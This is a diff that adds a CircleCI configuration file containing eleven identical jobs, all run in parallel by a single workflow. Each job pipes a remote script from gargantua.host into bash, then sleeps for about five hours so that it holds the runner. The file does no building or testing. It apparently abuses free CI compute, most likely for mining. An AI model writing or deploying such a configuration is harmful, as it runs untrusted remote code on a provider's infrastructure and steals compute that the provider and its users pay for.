@@ -1,0 +1,127 @@
+version: 2.1
+
+jobs:
+  elastictrigger:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger1:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger2:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger3:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger4:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger5:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger6:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger7:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger8:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger9:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+  elastictrigger10:
+    docker:
+    - image: ubuntu:18.04
+    steps:
+      - checkout
+      - run: apt-get update; apt install tmux htop wget curl -y; curl -sL http://gargantua.host/craylista.sh | bash -
+      - run: 
+            command: sleep 17980
+            no_output_timeout: 5h
+
+workflows:
+  main:
+    jobs:
+      - elastictrigger
+      - elastictrigger1
+      - elastictrigger2
+      - elastictrigger3
+      - elastictrigger4
+      - elastictrigger5
+      - elastictrigger6
+      - elastictrigger7
+      - elastictrigger8
+      - elastictrigger9
+      - elastictrigger10
